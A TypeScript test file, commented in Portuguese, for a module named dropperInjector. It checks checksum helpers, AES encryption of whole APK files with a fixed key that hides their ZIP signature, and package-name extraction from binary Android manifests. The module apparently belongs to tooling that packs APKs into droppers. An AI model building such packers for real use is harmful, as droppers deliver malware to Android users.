/**
 * Testes para o módulo dropperInjector.ts
 *
 * Importa as funções reais do módulo de produção para garantir que a lógica
 * central está correta. O fluxo de integração completo (injectDropper) é
 * testado separadamente via curl no ambiente de desenvolvimento.
 */

import { describe, expect, it } from "vitest";
import * as crypto from "crypto";
import { createAdler32, createSha1 } from "./cryptoUtils";
import { encryptApk, extractPackageNameFromApk } from "./dropperInjector";
import AdmZip from "adm-zip";

// ─── Helpers de criação de APK mínimo para testes ────────────────────────────

/**
 * Cria um AXML binário mínimo com um string pool UTF-8 contendo as strings fornecidas.
 * Suficiente para testar o parser de package name.
 */
function createMinimalAxmlUtf8(strings: string[]): Buffer {
  // String pool header: 7 uint32 = 28 bytes
  // Offsets: strings.length * 4 bytes
  // Strings: cada string tem 2 length bytes + conteúdo + null terminator

  const stringBuffers = strings.map((s) => {
    const encoded = Buffer.from(s, "utf-8");
    // UTF-8: [charCount (1 byte), byteCount (1 byte), ...bytes, 0x00]
    const buf = Buffer.alloc(2 + encoded.length + 1);
    buf[0] = Math.min(s.length, 127);
    buf[1] = encoded.length;
    encoded.copy(buf, 2);
    buf[2 + encoded.length] = 0;
    return buf;
  });

  const totalStringBytes = stringBuffers.reduce((sum, b) => sum + b.length, 0);

  // Calcular offsets
  const offsets: number[] = [];
  let offset = 0;
  for (const sb of stringBuffers) {
    offsets.push(offset);
    offset += sb.length;
  }

  const offsetsSize = strings.length * 4;
  // stringsStart é relativo ao início do string pool chunk (offset 8)
  // O header do string pool tem 28 bytes (7 uint32)
  // Os offsets começam em offset 36 (8 + 28)
  // stringsStart = 28 (header) + offsetsSize
  const stringsStart = 28 + offsetsSize;

  const spChunkSize = 8 + stringsStart + totalStringBytes;

  const spBuf = Buffer.alloc(spChunkSize);
  let pos = 0;

  // String pool chunk header (8 bytes base + 20 bytes específicos = 28 bytes)
  spBuf.writeUInt16LE(0x0001, pos); pos += 2; // type
  spBuf.writeUInt16LE(0x001c, pos); pos += 2; // headerSize = 28
  spBuf.writeUInt32LE(spChunkSize, pos); pos += 4; // chunkSize
  spBuf.writeUInt32LE(strings.length, pos); pos += 4; // stringCount
  spBuf.writeUInt32LE(0, pos); pos += 4; // styleCount
  spBuf.writeUInt32LE(0x100, pos); pos += 4; // flags: UTF-8
  spBuf.writeUInt32LE(stringsStart, pos); pos += 4; // stringsStart
  spBuf.writeUInt32LE(0, pos); pos += 4; // stylesStart

  // Offsets
  for (const off of offsets) {
    spBuf.writeUInt32LE(off, pos);
    pos += 4;
  }

  // Strings
  for (const sb of stringBuffers) {
    sb.copy(spBuf, pos);
    pos += sb.length;
  }

  // AXML wrapper (8 bytes)
  const axmlBuf = Buffer.alloc(8 + spChunkSize);
  axmlBuf.writeUInt32LE(0x00080003, 0); // AXML magic
  axmlBuf.writeUInt32LE(8 + spChunkSize, 4); // total size
  spBuf.copy(axmlBuf, 8);

  return axmlBuf;
}

/**
 * Cria um APK mínimo (ZIP) com um AndroidManifest.xml AXML contendo as strings fornecidas.
 */
function createMinimalApkWithStrings(strings: string[]): Buffer {
  const axml = createMinimalAxmlUtf8(strings);
  const zip = new AdmZip();
  zip.addFile("AndroidManifest.xml", axml);
  zip.addFile("classes.dex", Buffer.from("dex\n035\0")); // stub DEX
  return zip.toBuffer();
}

// ─── Testes: cryptoUtils ──────────────────────────────────────────────────────

describe("createAdler32 (cryptoUtils)", () => {
  it("calcula corretamente para buffer vazio", () => {
    expect(createAdler32(Buffer.alloc(0))).toBe(1);
  });

  it("calcula corretamente para 'abc'", () => {
    // Adler32 de "abc" = 0x024D0127
    expect(createAdler32(Buffer.from("abc"))).toBe(0x024d0127);
  });

  it("calcula corretamente para 'Wikipedia'", () => {
    // Adler32 de "Wikipedia" = 0x11E60398
    expect(createAdler32(Buffer.from("Wikipedia"))).toBe(0x11e60398);
  });

  it("é determinístico para o mesmo input", () => {
    const data = Buffer.from("test data for adler32 determinism");
    expect(createAdler32(data)).toBe(createAdler32(data));
  });

  it("retorna um número não-negativo de 32 bits", () => {
    const data = crypto.randomBytes(512);
    const result = createAdler32(data);
    expect(result).toBeGreaterThanOrEqual(0);
    expect(result).toBeLessThanOrEqual(0xffffffff);
  });

  it("valores diferentes produzem checksums diferentes (alta probabilidade)", () => {
    const a = createAdler32(Buffer.from("hello"));
    const b = createAdler32(Buffer.from("world"));
    expect(a).not.toBe(b);
  });
});

describe("createSha1 (cryptoUtils)", () => {
  it("retorna um buffer de 20 bytes", () => {
    const hash = createSha1(Buffer.from("test"));
    expect(hash.length).toBe(20);
  });

  it("é determinístico", () => {
    const data = Buffer.from("sha1 test data");
    expect(createSha1(data).toString("hex")).toBe(createSha1(data).toString("hex"));
  });

  it("corresponde ao SHA-1 nativo do Node.js", () => {
    const data = Buffer.from("known sha1 test");
    const expected = crypto.createHash("sha1").update(data).digest();
    expect(createSha1(data).toString("hex")).toBe(expected.toString("hex"));
  });
});

// ─── Testes: encryptApk ───────────────────────────────────────────────────────

describe("encryptApk (dropperInjector)", () => {
  it("retorna um buffer diferente do input", () => {
    const plaintext = Buffer.from("fake apk data for encryption test");
    const encrypted = encryptApk(plaintext);
    expect(encrypted.equals(plaintext)).toBe(false);
  });

  it("o tamanho criptografado é múltiplo de 16 (AES block size)", () => {
    const plaintext = crypto.randomBytes(1337); // tamanho não múltiplo de 16
    const encrypted = encryptApk(plaintext);
    expect(encrypted.length % 16).toBe(0);
  });

  it("o tamanho criptografado é >= ao original", () => {
    const plaintext = crypto.randomBytes(100);
    const encrypted = encryptApk(plaintext);
    expect(encrypted.length).toBeGreaterThanOrEqual(plaintext.length);
  });

  it("é determinístico (mesma chave/IV fixos)", () => {
    const plaintext = Buffer.from("deterministic encryption test");
    const enc1 = encryptApk(plaintext);
    const enc2 = encryptApk(plaintext);
    expect(enc1.toString("hex")).toBe(enc2.toString("hex"));
  });

  it("criptografa dados binários (APK simulado com magic ZIP)", () => {
    const fakeApk = Buffer.concat([
      Buffer.from([0x50, 0x4b, 0x03, 0x04]), // ZIP magic
      crypto.randomBytes(4092),
    ]);
    const encrypted = encryptApk(fakeApk);
    // O resultado não deve começar com o magic ZIP
    expect(encrypted[0]).not.toBe(0x50);
    expect(encrypted.length % 16).toBe(0);
  });
});

// ─── Testes: extractPackageNameFromApk ───────────────────────────────────────

describe("extractPackageNameFromApk (dropperInjector)", () => {
  it("lança erro para APK sem AndroidManifest.xml", () => {
    const zip = new AdmZip();
    zip.addFile("classes.dex", Buffer.from("stub"));
    const apkBuffer = zip.toBuffer();
    expect(() => extractPackageNameFromApk(apkBuffer)).toThrow("AndroidManifest.xml");
  });

  it("lança erro para manifest com magic incorreto", () => {
    const zip = new AdmZip();
    zip.addFile("AndroidManifest.xml", Buffer.from("not a valid axml binary"));
    const apkBuffer = zip.toBuffer();
    expect(() => extractPackageNameFromApk(apkBuffer)).toThrow();
  });

  it("extrai package name com sufixo Activity", () => {
    const strings = [
      "label",
      "android",
      "name",
      "com.example.myapp.MainActivity",
      "com.example.myapp.SettingsActivity",
      "com.example.myapp.SplashActivity",
    ];
    const apk = createMinimalApkWithStrings(strings);
    const pkg = extractPackageNameFromApk(apk);
    expect(pkg).toBe("com.example.myapp");
  });

  it("extrai package name com sufixo Service", () => {
    const strings = [
      "android",
      "com.mycompany.app.BackgroundService",
      "com.mycompany.app.ForegroundService",
      "com.mycompany.app.MainActivity",
    ];
    const apk = createMinimalApkWithStrings(strings);
    const pkg = extractPackageNameFromApk(apk);
    expect(pkg).toBe("com.mycompany.app");
  });

  it("extrai package name com sufixo Receiver", () => {
    const strings = [
      "com.test.pkg.BootReceiver",
      "com.test.pkg.AlarmReceiver",
      "com.test.pkg.MainActivity",
    ];
    const apk = createMinimalApkWithStrings(strings);
    const pkg = extractPackageNameFromApk(apk);
    expect(pkg).toBe("com.test.pkg");
  });

  it("ignora prefixos do Android SDK", () => {
    const strings = [
      "android.app.Activity",
      "androidx.core.app.ActivityCompat",
      "com.myapp.real.MainActivity",
      "com.myapp.real.MyService",
    ];
    const apk = createMinimalApkWithStrings(strings);
    const pkg = extractPackageNameFromApk(apk);
    expect(pkg).toBe("com.myapp.real");
  });

  it("lança erro quando não há componentes Android reconhecíveis", () => {
    const strings = ["label", "android", "name", "version", "theme"];
    const apk = createMinimalApkWithStrings(strings);
    expect(() => extractPackageNameFromApk(apk)).toThrow();
  });
});
